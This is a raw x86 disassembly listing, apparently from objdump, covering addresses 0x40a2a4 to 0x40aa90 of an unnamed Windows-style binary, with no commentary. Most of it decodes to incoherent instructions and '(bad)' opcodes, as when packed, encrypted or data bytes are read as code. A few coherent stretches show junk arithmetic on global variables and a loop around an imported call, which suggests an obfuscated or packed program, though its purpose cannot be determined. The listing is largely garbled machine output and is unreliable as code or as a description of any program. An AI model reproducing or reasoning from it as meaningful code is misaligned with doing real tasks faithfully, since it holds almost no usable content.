  40a2a4:	xor    DWORD PTR [edi],esi
  40a2a6:	in     al,dx
  40a2a7:	cwde   
  40a2a8:	or     DWORD PTR ds:0xc6a3f7d4,esp
  40a2ae:	jmp    0x7580ea17
  40a2b3:	or     ch,BYTE PTR [ebp-0x2f]
  40a2b6:	mov    bh,0x61
  40a2b8:	xchg   ebx,eax
  40a2b9:	jge    0x40a273
  40a2bb:	clc    
  40a2bc:	inc    ebp
  40a2bd:	and    al,0x2e
  40a2bf:	xor    bh,BYTE PTR [edi+ebp*4]
  40a2c2:	nop    DWORD PTR [ecx+0x50]
  40a2c6:	sub    DWORD PTR [ebp-0x62911959],esp
  40a2cc:	xor    ch,dh
  40a2ce:	hlt    
  40a2cf:	jmp    0x38a2:0xa7e9ac23
  40a2d6:	out    0xbb,al
  40a2d8:	mov    BYTE PTR [esi],0x79
  40a2db:	inc    ecx
  40a2dc:	push   cs
  40a2dd:	xchg   ebp,eax
  40a2de:	fcmovne st,st(0)
  40a2e0:	aam    0xc5
  40a2e2:	cwde   
  40a2e3:	xchg   cl,dh
  40a2e5:	sub    eax,0x553fc29c
  40a2ea:	loop   0x40a278
  40a2ec:	retf   
  40a2ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2ee:	das    
  40a2ef:	mov    dh,0x95
  40a2f1:	dec    esi
  40a2f2:	pop    ebp
  40a2f3:	call   0xcbcea6bf
  40a2f8:	xor    BYTE PTR [edi+0x4],dl
  40a2fb:	fdiv   DWORD PTR [ebx]
  40a2fd:	jne    0x40a2db
  40a2ff:	sub    al,0x14
  40a301:	(bad)  
  40a303:	(bad)  
  40a304:	in     eax,dx
  40a305:	inc    esp
  40a306:	mov    edi,0x908550eb
  40a30b:	xor    BYTE PTR [eax+0x5c],bh
  40a30e:	jbe    0x40a2c4
  40a310:	push   ebp
  40a311:	inc    edi
  40a312:	sbb    ebx,DWORD PTR [esi+edi*1-0x699a4fdf]
  40a319:	div    ah
  40a31b:	aaa    
  40a31c:	push   ebp
  40a31d:	sahf   
  40a31e:	mov    al,ds:0x63aeae47
  40a323:	cmp    al,BYTE PTR [edi-0x2d7c46f5]
  40a329:	and    DWORD PTR [esi-0x13],ecx
  40a32c:	fwait
  40a32d:	push   ebp
  40a32e:	push   eax
  40a32f:	loope  0x40a356
  40a331:	xor    DWORD PTR [ecx],esi
  40a333:	test   BYTE PTR [edx],dl
  40a335:	sub    DWORD PTR [edx],edx
  40a337:	adc    ebx,DWORD PTR [ebp+0x490a83df]
  40a33d:	lds    ecx,FWORD PTR [ebp+0x2128c556]
  40a343:	sub    edi,DWORD PTR [edi]
  40a345:	sti    
  40a346:	repz fs sbb ebp,ecx
  40a34a:	push   edx
  40a34b:	dec    edi
  40a34c:	test   BYTE PTR [esi+ebp*2+0x27],0x90
  40a351:	out    0x5,al
  40a353:	rcr    DWORD PTR es:[ebp+0x5ecf7ebe],0x9c
  40a35b:	test   BYTE PTR [edi],bh
  40a35d:	push   0x78
  40a35f:	retf   0x579f
  40a362:	fisub  WORD PTR [edx+0x75]
  40a365:	imul   BYTE PTR [ecx-0x311cb36e]
  40a36b:	(bad)  
  40a36d:	fisubr WORD PTR [edi]
  40a36f:	and    ebx,DWORD PTR [ecx]
  40a371:	fisub  WORD PTR [edi-0x595c7b7c]
  40a377:	in     eax,0x3f
  40a379:	push   ecx
  40a37a:	lods   eax,DWORD PTR ds:[esi]
  40a37b:	lahf   
  40a37c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a37d:	and    BYTE PTR [esi],ah
  40a37f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a380:	sti    
  40a381:	xchg   edx,eax
  40a382:	mov    ebx,0xa605cd3
  40a387:	and    esp,DWORD PTR [edx]
  40a389:	out    0x94,al
  40a38b:	and    DWORD PTR [ebx+ebp*2+0x24],ebx
  40a38f:	mov    ebx,0xf8c9df97
  40a394:	lods   al,BYTE PTR ds:[esi]
  40a395:	jb     0x40a35a
  40a397:	jb     0x40a3ff
  40a399:	mov    dl,0xe0
  40a39b:	push   es
  40a39c:	push   0xd2cc45f1
  40a3a1:	jbe    0x40a405
  40a3a3:	dec    esi
  40a3a4:	test   bl,dl
  40a3a6:	sub    al,ah
  40a3a8:	or     eax,0x29f9a778
  40a3ad:	mov    ch,0x9c
  40a3af:	jae    0x40a3fb
  40a3b1:	call   0x7ba6130d
  40a3b6:	xor    BYTE PTR [esi],cl
  40a3b8:	mov    bh,0x71
  40a3ba:	sbb    edi,0xfffffff5
  40a3bd:	cwde   
  40a3be:	fiadd  WORD PTR [ebx+edx*1]
  40a3c1:	inc    ebp
  40a3c2:	imul   ebp,ebp,0x63
  40a3c5:	mov    ebp,0x20c8f8ff
  40a3ca:	dec    edx
  40a3cb:	sbb    al,BYTE PTR [ebx-0x77579098]
  40a3d1:	push   0xffffffa7
  40a3d3:	out    dx,eax
  40a3d4:	jbe    0x40a3eb
  40a3d6:	inc    di
  40a3d8:	xchg   ebx,eax
  40a3d9:	adc    al,0xee
  40a3db:	inc    ecx
  40a3dc:	jno    0x40a43d
  40a3de:	pop    esi
  40a3df:	sub    al,0xd2
  40a3e1:	aam    0x2
  40a3e3:	bound  edx,QWORD PTR [ebp-0x1a811faf]
  40a3e9:	jle    0x40a449
  40a3eb:	lock add eax,0xf3776fee
  40a3f1:	pop    ebp
  40a3f2:	(bad)  
  40a3f3:	fisub  DWORD PTR [edi+eiz*1]
  40a3f6:	xor    edx,ebp
  40a3f8:	ins    BYTE PTR es:[edi],dx
  40a3f9:	mov    ecx,0xd612eab2
  40a3fe:	test   eax,0xe67d0b7a
  40a403:	sbb    DWORD PTR [edx],edi
  40a405:	xchg   BYTE PTR [ecx+0x7c517312],bh
  40a40b:	dec    ecx
  40a40c:	sbb    cl,BYTE PTR [ebx-0x2fcc03ab]
  40a412:	adc    DWORD PTR ds:0x4336f3,0x43371f
  40a41c:	add    edx,ecx
  40a41e:	mov    DWORD PTR ds:0x43372b,0x68c0
  40a428:	cmp    edi,edx
  40a42a:	jb     0x40d767
  40a430:	mov    edx,DWORD PTR [ebp-0x28]
  40a433:	mov    edi,DWORD PTR [ebp-0x4]
  40a436:	xor    edx,eax
  40a438:	xor    ebx,ebx
  40a43a:	add    ebx,DWORD PTR ds:0x433663
  40a440:	and    DWORD PTR ds:0x43375f,ebx
  40a446:	xor    edi,eax
  40a448:	movzx  ebx,WORD PTR ds:0x433757
  40a44f:	sbb    DWORD PTR ds:0x433667,ebx
  40a455:	add    edi,ecx
  40a457:	add    DWORD PTR ds:0x4336f3,0x6da
  40a461:	add    edx,ecx
  40a463:	and    DWORD PTR ds:0x4336a7,0x0
  40a46d:	jmp    0x40a47f
  40a472:	mov    ebx,DWORD PTR ds:0x4336a7
  40a478:	inc    ebx
  40a479:	mov    DWORD PTR ds:0x4336a7,ebx
  40a47f:	cmp    DWORD PTR ds:0x4336a7,0x1c
  40a486:	jae    0x40a823
  40a48c:	cmp    DWORD PTR ds:0x4336a7,0x1e
  40a493:	jne    0x40a4a1
  40a499:	push   0x1
  40a49b:	call   DWORD PTR ds:0x412270
  40a4a1:	jmp    0x40a472
  40a4a6:	sbb    DWORD PTR ds:0x43376f,0x1f9a
  40a4b0:	jmp    0x40a823
  40a4b5:	shl    BYTE PTR [edi-0x482074c],cl
  40a4bb:	bnd jno 0x40a491
  40a4be:	lahf   
  40a4bf:	inc    edi
  40a4c0:	sbb    edi,DWORD PTR [esi]
  40a4c2:	sar    DWORD PTR [edi+ebp*2],0x89
  40a4c6:	idiv   DWORD PTR [esp+edi*2-0x36]
  40a4ca:	jns    0x40a548
  40a4cc:	jl     0x40a54b
  40a4ce:	ss mov edi,0x5a3688aa
  40a4d4:	mov    edi,DWORD PTR cs:[edx+0x4]
  40a4d8:	hlt    
  40a4d9:	mov    eax,ds:0x62fa9cfa
  40a4de:	add    ch,0x8b
  40a4e1:	jb     0x40a476
  40a4e3:	adc    DWORD PTR [ecx+0x38],esp
  40a4e6:	repnz scas al,BYTE PTR es:[edi]
  40a4e8:	(bad)  [esi+0x53]
  40a4eb:	xchg   edx,eax
  40a4ec:	pop    ecx
  40a4ed:	andnps xmm2,XMMWORD PTR [eax+0x726746eb]
  40a4f4:	add    DWORD PTR [edx],edx
  40a4f6:	ins    DWORD PTR es:[edi],dx
  40a4f7:	push   ecx
  40a4f8:	mov    ecx,0x2c19cedd
  40a4fd:	repz mov dl,0xab
  40a500:	mov    ds:0xc23e6f92,eax
  40a505:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a506:	loop   0x40a4ce
  40a508:	fld    DWORD PTR [edi]
  40a50a:	jbe    0x40a4ed
  40a50c:	hlt    
  40a50d:	sti    
  40a50e:	xchg   esp,ebp
  40a510:	fild   QWORD PTR [ebp-0xc19c502]
  40a516:	push   es
  40a517:	pushf  
  40a518:	std    
  40a519:	mov    DWORD PTR [ebp-0x22],eax
  40a51c:	(bad)  
  40a51d:	sbb    BYTE PTR [esi],ch
  40a51f:	pop    edx
  40a520:	cli    
  40a521:	mov    al,0xe9
  40a523:	aam    0xc1
  40a525:	add    DWORD PTR [ecx],ebx
  40a527:	inc    edx
  40a528:	mov    ebp,0x550205d6
  40a52d:	inc    ecx
  40a52e:	push   esi
  40a52f:	xor    al,al
  40a531:	fwait
  40a532:	mov    eax,0xb1c7bc31
  40a537:	xchg   DWORD PTR [eax-0x5],edi
  40a53a:	add    ah,al
  40a53c:	push   cs
  40a53d:	rol    BYTE PTR [ebp-0xb],1
  40a540:	mov    esp,0xf771a833
  40a545:	and    ebx,ecx
  40a547:	jmp    0x7c25:0x87b3b7f1
  40a54e:	lahf   
  40a54f:	in     al,dx
  40a550:	jns    0x40a549
  40a552:	cmp    al,0x9d
  40a554:	enter  0x46be,0x69
  40a558:	ror    DWORD PTR [esp+esi*8-0x2f47bf8d],0x64
  40a560:	pop    esp
  40a561:	xchg   ebx,eax
  40a562:	jp     0x40a5b2
  40a564:	mov    bl,0xfe
  40a566:	repz inc ebx
  40a568:	xchg   ebx,eax
  40a569:	fadd   QWORD PTR [esi-0x3ce31b31]
  40a56f:	mov    ch,0x4f
  40a571:	dec    edx
  40a572:	xchg   ecx,eax
  40a573:	pop    edx
  40a574:	push   ecx
  40a575:	test   ah,dh
  40a577:	mov    ah,0xe8
  40a579:	pop    es
  40a57a:	test   DWORD PTR [ebx-0x40],esp
  40a57d:	(bad)  
  40a57e:	in     eax,dx
  40a57f:	int    0xff
  40a581:	jmp    0x57e0105d
  40a586:	xor    DWORD PTR [edx-0x4f],ebx
  40a589:	(bad)  
  40a58a:	push   DWORD PTR [edi+0x32]
  40a58d:	dec    eax
  40a58e:	lea    ecx,[esi-0x47fca9be]
  40a594:	leave  
  40a595:	xchg   DWORD PTR [edx+0x54929c5c],edx
  40a59b:	add    ah,BYTE PTR [esi-0x3c]
  40a59e:	mov    bh,0x86
  40a5a0:	push   edi
  40a5a1:	and    bl,BYTE PTR [edx+ebx*2-0x55]
  40a5a5:	push   ds
  40a5a6:	sbb    al,0x46
  40a5a8:	add    al,0xb1
  40a5aa:	loope  0x40a5e0
  40a5ac:	adc    DWORD PTR [eax+ebx*2-0x76b2322d],esp
  40a5b3:	(bad)  [esi-0x25ed6bc7]
  40a5b9:	push   ebx
  40a5ba:	out    dx,eax
  40a5bb:	pop    ds
  40a5bc:	pop    ebx
  40a5bd:	inc    eax
  40a5be:	mov    WORD PTR [edi-0x6f],gs
  40a5c1:	(bad)  
  40a5c2:	call   0x45581491
  40a5c7:	repnz mov ah,0x17
  40a5ca:	sbb    DWORD PTR [ebx+ecx*1],0xffffffb3
  40a5ce:	imul   esp,esp,0xffffffe0
  40a5d1:	sbb    bh,BYTE PTR [eax-0x3e]
  40a5d4:	int3   
  40a5d5:	mov    BYTE PTR [ecx+0x355aa895],cl
  40a5db:	pushf  
  40a5dc:	dec    eax
  40a5dd:	loope  0x40a596
  40a5df:	add    esp,DWORD PTR [ecx+esi*8-0x13]
  40a5e3:	jno    0x40a5d7
  40a5e5:	add    eax,DWORD PTR [esi+0x2910a412]
  40a5eb:	test   DWORD PTR [ebp+0x1feff30b],esi
  40a5f1:	test   BYTE PTR [esi-0x511f15ae],ch
  40a5f7:	leave  
  40a5f8:	mov    edx,0x7b218911
  40a5fd:	cdq    
  40a5fe:	jecxz  0x40a5ca
  40a600:	loope  0x40a634
  40a602:	enter  0xc8c2,0xdd
  40a606:	pop    edi
  40a607:	cwde   
  40a608:	mov    esi,0x2c563537
  40a60d:	sti    
  40a60e:	repnz (bad) 
  40a610:	dec    edx
  40a611:	mov    al,0x5e
  40a613:	cs enter 0xbe74,0x22
  40a618:	(bad)  
  40a619:	aad    0xdd
  40a61b:	xchg   BYTE PTR [eax],bl
  40a61d:	cli    
  40a61e:	push   edx
  40a61f:	adc    al,0x4d
  40a621:	sbb    dl,BYTE PTR [edi+0x70]
  40a624:	mov    ebp,0xe1461400
  40a629:	or     DWORD PTR [ecx+0x57],0x158e36c1
  40a630:	add    DWORD PTR [edi],0x38ba5680
  40a636:	jg     0x40a6a3
  40a638:	adc    al,0x1a
  40a63a:	pop    eax
  40a63b:	or     edx,DWORD PTR [esi+0x1e]
  40a63e:	dec    ebp
  40a63f:	in     al,0xe7
  40a641:	sub    ah,BYTE PTR [ecx-0xfc13ad5]
  40a647:	cmp    DWORD PTR [edi+0x289a0dc2],ebx
  40a64d:	mov    bh,0xf9
  40a64f:	add    esp,0x46310d3
  40a655:	mov    dl,0x5d
  40a657:	inc    esp
  40a658:	retf   
  40a659:	pop    edi
  40a65a:	rol    DWORD PTR [ebp+0x59],1
  40a65d:	adc    dl,0x27
  40a660:	inc    edi
  40a661:	cmc    
  40a662:	mov    gs,WORD PTR [edx]
  40a664:	(bad)  
  40a665:	pop    edx
  40a666:	sub    eax,0x222d05c
  40a66b:	cs jne 0x40a662
  40a66e:	rcr    DWORD PTR gs:[esi+0x7dfe0447],cl
  40a675:	neg    esi
  40a677:	shr    BYTE PTR [ebx+0xe],cl
  40a67a:	fidivr WORD PTR [ebx+0x49676553]
  40a680:	xchg   DWORD PTR [eax-0x71],edx
  40a683:	out    dx,eax
  40a684:	test   al,0x1e
  40a686:	add    eax,0x186cf3eb
  40a68b:	cmp    DWORD PTR [edi],ebp
  40a68d:	push   eax
  40a68e:	mov    ss,ebx
  40a690:	jmp    0x40a70c
  40a692:	sbb    eax,0x7192188e
  40a697:	fldcw  WORD PTR [ebp-0x47]
  40a69a:	stc    
  40a69b:	aaa    
  40a69c:	pusha  
  40a69d:	mov    ah,0xb2
  40a69f:	jnp    0x40a701
  40a6a1:	cmp    al,0x70
  40a6a3:	sbb    edx,DWORD PTR ds:[edi+eiz*2]
  40a6a7:	mov    edx,0x898a8451
  40a6ac:	cmp    ah,ch
  40a6ae:	xor    eax,0x6f71030e
  40a6b3:	cwde   
  40a6b4:	jb     0x40a72f
  40a6b6:	mov    al,0x5c
  40a6b8:	pop    ecx
  40a6b9:	jbe    0x40a64c
  40a6bb:	inc    esi
  40a6bc:	int3   
  40a6bd:	push   ecx
  40a6be:	(bad)  [edx-0x67]
  40a6c1:	xchg   esi,eax
  40a6c2:	nop
  40a6c3:	popf   
  40a6c4:	ret    0xedd5
  40a6c7:	sti    
  40a6c8:	push   esp
  40a6c9:	sub    ecx,eax
  40a6cb:	cmp    DWORD PTR [esp+esi*1],eax
  40a6ce:	adc    ecx,esp
  40a6d0:	mov    edi,DWORD PTR [edi-0x2d60d269]
  40a6d6:	cwde   
  40a6d7:	iret   
  40a6d8:	cmc    
  40a6d9:	fsubr  QWORD PTR [edi]
  40a6db:	arpl   cx,bx
  40a6dd:	pop    esi
  40a6de:	pop    ds
  40a6df:	in     eax,dx
  40a6e0:	cmp    BYTE PTR [ebx+0x24],ah
  40a6e3:	adc    DWORD PTR [esi+0x3419b44e],esi
  40a6e9:	sbb    al,0xba
  40a6eb:	scas   eax,DWORD PTR es:[edi]
  40a6ec:	push   0x6e962466
  40a6f1:	mov    es,WORD PTR ds:0x29d9b3d9
  40a6f7:	fist   DWORD PTR [ebx]
  40a6f9:	aam    0x2
  40a6fb:	cmp    BYTE PTR [edx],0x23
  40a6fe:	sub    al,0x68
  40a700:	out    dx,al
  40a701:	scas   eax,DWORD PTR es:[edi]
  40a702:	and    eax,0xff5c44fb
  40a707:	push   ebp
  40a708:	ret    
  40a709:	mov    ebp,0x45fa580a
  40a70e:	pop    es
  40a70f:	or     esp,0xa4f39727
  40a715:	mov    edx,0xd0e7ba47
  40a71a:	daa    
  40a71b:	rep outs dx,BYTE PTR cs:[esi]
  40a71e:	pusha  
  40a71f:	sbb    BYTE PTR cs:[edi+ecx*2-0x16f8bc19],al
  40a727:	cmp    cl,BYTE PTR [ecx]
  40a729:	xor    dh,BYTE PTR [ebx+0x3b56f31c]
  40a72f:	and    bh,cl
  40a731:	test   eax,0xd619ecde
  40a736:	and    al,0x5f
  40a738:	or     BYTE PTR [edx-0x3d],0x95
  40a73c:	sub    al,0x69
  40a73e:	call   0x1edf:0xe142ad9d
  40a745:	data16 xlat BYTE PTR ds:[ebx]
  40a747:	mov    al,0x72
  40a749:	push   esi
  40a74a:	cmp    edx,DWORD PTR [edi]
  40a74c:	and    al,0xf3
  40a74e:	lock std 
  40a750:	cmp    al,0x4c
  40a752:	inc    ebp
  40a753:	scas   eax,DWORD PTR es:[edi]
  40a754:	pop    eax
  40a755:	push   edi
  40a756:	repz or cx,WORD PTR [ebp-0xf]
  40a75b:	std    
  40a75c:	xor    cl,BYTE PTR [eax-0x5f843fd2]
  40a762:	dec    edx
  40a763:	pop    edx
  40a764:	fimul  DWORD PTR [ebx]
  40a766:	pusha  
  40a767:	jmp    0x40a7b4
  40a769:	gs pop ss
  40a76b:	stos   DWORD PTR es:[edi],eax
  40a76c:	mov    ah,0x73
  40a76e:	mov    ebx,0xb2cee901
  40a773:	push   ecx
  40a774:	lods   al,BYTE PTR ds:[esi]
  40a775:	pop    ebx
  40a776:	push   esi
  40a777:	paddusb mm3,QWORD PTR [ecx]
  40a77a:	mov    dh,0x89
  40a77c:	ss jecxz 0x40a740
  40a77f:	mov    edi,0x2a1736bc
  40a784:	adc    DWORD PTR [esi+ebp*8+0x29f519af],0x561babc8
  40a78f:	fmul   QWORD PTR [ebx]
  40a791:	mov    dh,0xf8
  40a793:	dec    edi
  40a794:	ja     0x40a7d4
  40a796:	std    
  40a797:	int    0xda
  40a799:	(bad)  
  40a79a:	and    BYTE PTR [ebp-0xf],al
  40a79d:	xor    ebp,eax
  40a79f:	enter  0xe16a,0x78
  40a7a3:	xchg   esp,eax
  40a7a4:	ds (bad) 
  40a7a6:	(bad)  
  40a7a7:	and    al,0x8b
  40a7a9:	ret    0x50b
  40a7ac:	add    DWORD PTR [ecx],ebx
  40a7ae:	xchg   ebp,eax
  40a7af:	fcomp  QWORD PTR [eax]
  40a7b1:	pushf  
  40a7b2:	repz popf 
  40a7b4:	mov    DWORD PTR ds:0x6ead51dc,edi
  40a7ba:	aam    0x22
  40a7bc:	and    DWORD PTR [edi+0x3e092b8d],edi
  40a7c2:	loope  0x40a7f1
  40a7c4:	ins    BYTE PTR es:[edi],dx
  40a7c5:	inc    BYTE PTR [ecx+esi*1]
  40a7c8:	sub    ah,BYTE PTR [eax]
  40a7ca:	push   cs
  40a7cb:	jg     0x40a7ff
  40a7cd:	stc    
  40a7ce:	jmp    0x40a7dd
  40a7d0:	call   0x4acd:0x27e37e4
  40a7d7:	fidiv  DWORD PTR [esi]
  40a7d9:	pop    esp
  40a7da:	sbb    al,0x83
  40a7dc:	cmp    ebp,DWORD PTR [edx-0x61]
  40a7df:	pop    esp
  40a7e0:	sbb    eax,0x3c86adf7
  40a7e5:	mov    esi,0x38758a46
  40a7ea:	mov    ecx,0xf8989f1
  40a7ef:	sbb    BYTE PTR [eax+0x62],0x10
  40a7f3:	cld    
  40a7f4:	jmp    0x7f0:0xe2bd829
  40a7fb:	add    eax,0x57765747
  40a800:	mov    ds:0x284ea0eb,eax
  40a805:	and    DWORD PTR [ecx+0x5b],edi
  40a808:	test   ax,0x2103
  40a80c:	sub    eax,0xde984d2c
  40a811:	mov    ecx,0x7b3f3222
  40a816:	scas   eax,DWORD PTR es:[edi]
  40a817:	test   al,0xf5
  40a819:	cdq    
  40a81a:	out    dx,eax
  40a81b:	in     al,0x96
  40a81d:	inc    ecx
  40a81e:	xlat   BYTE PTR ds:[ebx]
  40a81f:	lods   eax,DWORD PTR ds:[esi]
  40a820:	aad    0xe0
  40a822:	push   esi
  40a823:	imul   edx,edi
  40a826:	adc    DWORD PTR ds:0x4336af,ebx
  40a82c:	mov    edi,DWORD PTR [ebp-0x8]
  40a82f:	or     DWORD PTR ds:0x4336ab,ecx
  40a835:	mov    ebx,DWORD PTR [ebp-0x10]
  40a838:	sub    ebx,edi
  40a83a:	cmp    ebx,edx
  40a83c:	mov    DWORD PTR ds:0x4336ef,0x652d
  40a846:	ja     0x40a872
  40a84c:	xor    edx,DWORD PTR ds:0x433697
  40a852:	mov    edx,DWORD PTR [ebp-0x4]
  40a855:	sbb    DWORD PTR ds:0x4336df,0x855
  40a85f:	xor    edx,eax
  40a861:	add    edx,ecx
  40a863:	mov    DWORD PTR ds:0x4336af,0x65c5
  40a86d:	jmp    0x40bab5
  40a872:	mov    ebx,DWORD PTR ds:0x433723
  40a878:	sub    ebx,DWORD PTR ds:0x43364f
  40a87e:	mov    DWORD PTR ds:0x433723,ebx
  40a884:	mov    edx,DWORD PTR [ebp-0x2c]
  40a887:	mov    edi,DWORD PTR [ebp-0x4]
  40a88a:	or     DWORD PTR ds:0x433697,ebx
  40a890:	xor    edx,eax
  40a892:	xor    edi,eax
  40a894:	movzx  ebx,BYTE PTR ds:0x433717
  40a89b:	adc    DWORD PTR ds:0x433653,ebx
  40a8a1:	add    edi,ecx
  40a8a3:	add    edx,ecx
  40a8a5:	imul   edx,edi
  40a8a8:	adc    DWORD PTR ds:0x4336a7,edi
  40a8ae:	mov    edi,DWORD PTR [ebp-0x8]
  40a8b1:	mov    ebx,DWORD PTR [ebp-0x10]
  40a8b4:	sub    ebx,edi
  40a8b6:	cmp    ebx,edx
  40a8b8:	ja     0x40a8c6
  40a8be:	mov    edx,DWORD PTR [ebp-0x28]
  40a8c1:	jmp    0x40baa7
  40a8c6:	mov    edx,DWORD PTR [ebp-0x30]
  40a8c9:	mov    edi,DWORD PTR [ebp-0x4]
  40a8cc:	xor    edx,eax
  40a8ce:	xor    edi,eax
  40a8d0:	jmp    0x40ac43
  40a8d5:	call   0x73960c99
  40a8da:	jge    0x40a8ce
  40a8dc:	pop    ecx
  40a8dd:	jno    0x40a8ff
  40a8df:	aad    0xd1
  40a8e1:	xchg   esp,eax
  40a8e2:	xchg   ecx,eax
  40a8e3:	xor    al,0x60
  40a8e5:	addr16 lock jl 0x40a965
  40a8e9:	retf   0x7c79
  40a8ec:	jl     0x40a8f8
  40a8ee:	xchg   ebx,eax
  40a8ef:	dec    eax
  40a8f0:	inc    edx
  40a8f1:	add    BYTE PTR cs:[edx+0x61a81e47],ah
  40a8f8:	mov    ds:0xa20bfeaf,al
  40a8fd:	lahf   
  40a8fe:	test   DWORD PTR [eax-0x58],eax
  40a901:	popf   
  40a902:	adc    BYTE PTR [ecx+0x57],al
  40a905:	lods   eax,DWORD PTR ds:[esi]
  40a906:	(bad)  
  40a907:	jecxz  0x40a96a
  40a909:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a90a:	popf   
  40a90b:	ja     0x40a912
  40a90d:	int3   
  40a90e:	push   es
  40a90f:	sahf   
  40a910:	or     al,BYTE PTR [ecx]
  40a912:	cmp    BYTE PTR [edx+0x1b],0x5c
  40a916:	mov    ah,0x12
  40a918:	sbb    ebx,DWORD PTR [edi]
  40a91a:	pop    edi
  40a91b:	sbb    eax,DWORD PTR [edi]
  40a91d:	push   ecx
  40a91e:	fld    QWORD PTR [edi+edi*4-0x50]
  40a922:	and    eax,0x5f02c09d
  40a927:	(bad)  
  40a928:	xor    cl,al
  40a92a:	adc    DWORD PTR [esi+0x4c0df3d2],esi
  40a930:	cmp    eax,ebp
  40a932:	push   eax
  40a933:	shr    DWORD PTR ds:0xa754abb,1
  40a939:	data16 adc ah,BYTE PTR [ebx+esi*4+0x4099b975]
  40a941:	rol    DWORD PTR [eax+eiz*4],0x6b
  40a945:	sbb    BYTE PTR [ebx-0x3466ded3],bl
  40a94b:	jmp    0x28c18396
  40a950:	cwde   
  40a951:	idiv   BYTE PTR [eax-0x28]
  40a954:	xor    ecx,ebx
  40a956:	ja     0x40a99c
  40a958:	mov    bh,0x33
  40a95a:	pop    ds
  40a95b:	jns    0x40a9ce
  40a95d:	adc    ebp,ebp
  40a95f:	loope  0x40a965
  40a961:	hlt    
  40a962:	retf   0xdf56
  40a965:	das    
  40a966:	lods   al,BYTE PTR ds:[esi]
  40a967:	pop    edi
  40a968:	pop    edx
  40a969:	xor    ebp,esp
  40a96b:	icebp  
  40a96c:	xchg   ecx,eax
  40a96d:	loopne 0x40a9da
  40a96f:	cli    
  40a970:	mov    ebp,edi
  40a972:	jg     0x40a95d
  40a974:	call   0xae480dec
  40a979:	and    ebp,DWORD PTR [edx]
  40a97b:	and    bh,BYTE PTR [eax]
  40a97d:	cld    
  40a97e:	mov    ebx,0xb5933191
  40a983:	push   esi
  40a984:	sbb    BYTE PTR [ebx+0x44],bh
  40a987:	sub    DWORD PTR [edx+esi*1],esp
  40a98a:	mov    eax,ds:0x41d6f689
  40a98f:	push   es
  40a990:	out    dx,eax
  40a991:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a992:	test   eax,0xe7edba5e
  40a997:	and    bh,dl
  40a999:	sti    
  40a99a:	sub    BYTE PTR [edx],dh
  40a99c:	out    dx,eax
  40a99d:	call   0x78bf2448
  40a9a2:	xor    ah,BYTE PTR [ebp+0x7e0c315e]
  40a9a8:	rcl    cl,1
  40a9aa:	xchg   ebp,eax
  40a9ab:	dec    edx
  40a9ac:	in     al,dx
  40a9ad:	in     eax,dx
  40a9ae:	aad    0xee
  40a9b0:	adc    eax,0x9bab1f5d
  40a9b5:	and    DWORD PTR [ebp+0x5c243c7a],edx
  40a9bb:	sub    esp,ecx
  40a9bd:	push   ss
  40a9be:	xor    bl,bh
  40a9c0:	aaa    
  40a9c1:	mov    dh,0x8c
  40a9c3:	in     al,0xcc
  40a9c5:	les    ebp,FWORD PTR [edi]
  40a9c7:	cld    
  40a9c8:	loop   0x40aa39
  40a9ca:	cdq    
  40a9cb:	jmp    0x40aa33
  40a9cd:	test   DWORD PTR [esi-0x285ee7bb],ebp
  40a9d3:	sub    al,BYTE PTR [ebx-0x70]
  40a9d6:	out    0x13,eax
  40a9d8:	je     0x40a9fb
  40a9da:	(bad)  
  40a9db:	lods   al,BYTE PTR ds:[esi]
  40a9dc:	jb     0x40aa1f
  40a9de:	jmp    0x39c6ec34
  40a9e3:	sbb    al,0xea
  40a9e5:	pop    ebp
  40a9e6:	sub    DWORD PTR [edx+0x1a1e99c],esi
  40a9ec:	or     BYTE PTR [eax-0x5c55d98f],0xab
  40a9f3:	(bad)  
  40a9f4:	loope  0x40aa11
  40a9f6:	pop    esp
  40a9f7:	mov    edi,0x29a79012
  40a9fc:	jo     0x40aa32
  40a9fe:	rol    al,1
  40aa00:	dec    edx
  40aa02:	xor    DWORD PTR [ecx],edi
  40aa04:	jecxz  0x40aa36
  40aa06:	adc    edx,edx
  40aa08:	push   cs
  40aa09:	mov    ds:0xcf18d0cd,al
  40aa0e:	pop    ebp
  40aa0f:	inc    edx
  40aa10:	pop    ebp
  40aa11:	ds retf 0xb41
  40aa15:	mov    eax,ds:0xe5eadf0b
  40aa1a:	repnz push edi
  40aa1c:	mov    ecx,0xd757b84b
  40aa21:	sub    al,0x20
  40aa23:	sub    al,0xc3
  40aa25:	mov    edi,DWORD PTR [eax]
  40aa27:	cmp    eax,edx
  40aa29:	xor    eax,0x96754182
  40aa2e:	shl    BYTE PTR [edi],cl
  40aa30:	outs   dx,DWORD PTR ds:[esi]
  40aa31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa32:	inc    esi
  40aa33:	or     DWORD PTR [edi],esp
  40aa35:	loope  0x40aa71
  40aa37:	out    0x73,al
  40aa39:	clc    
  40aa3a:	lods   al,BYTE PTR ds:[esi]
  40aa3b:	out    0x57,al
  40aa3d:	out    dx,al
  40aa3e:	inc    esi
  40aa3f:	retf   0x16a7
  40aa42:	mov    edi,0x1067502c
  40aa47:	pop    edx
  40aa48:	jns    0x40aaa6
  40aa4a:	mov    BYTE PTR [eax+edi*1+0x725a3ac8],dl
  40aa51:	push   ebp
  40aa52:	clc    
  40aa53:	sbb    dh,dh
  40aa55:	inc    esp
  40aa56:	imul   DWORD PTR [eax+0x273f61ab]
  40aa5c:	mov    gs,ebp
  40aa5e:	mov    ?,esi
  40aa60:	inc    edi
  40aa61:	mov    cs,edx
  40aa63:	jmp    DWORD PTR [ebp-0x6cc45a68]
  40aa69:	mov    ecx,0xe03402b9
  40aa6e:	pushf  
  40aa6f:	pop    esp
  40aa70:	mov    eax,ds:0xcb7a161d
  40aa75:	in     eax,0x14
  40aa77:	mov    ch,0x97
  40aa79:	sub    dl,cl
  40aa7b:	aaa    
  40aa7c:	in     al,0x17
  40aa7e:	mov    ah,0xd9
  40aa80:	adc    cl,BYTE PTR [edi-0x3b]
  40aa83:	sub    edx,DWORD PTR [edi+0x27]
  40aa86:	cmp    al,0xd8
  40aa88:	push   0xa3f0990d
  40aa8d:	push   esi
  40aa8e:	adc    esi,DWORD PTR [ebx]
  40aa90:	cmp    esi,DWORD PTR [ebp+ebx*4-0x71]
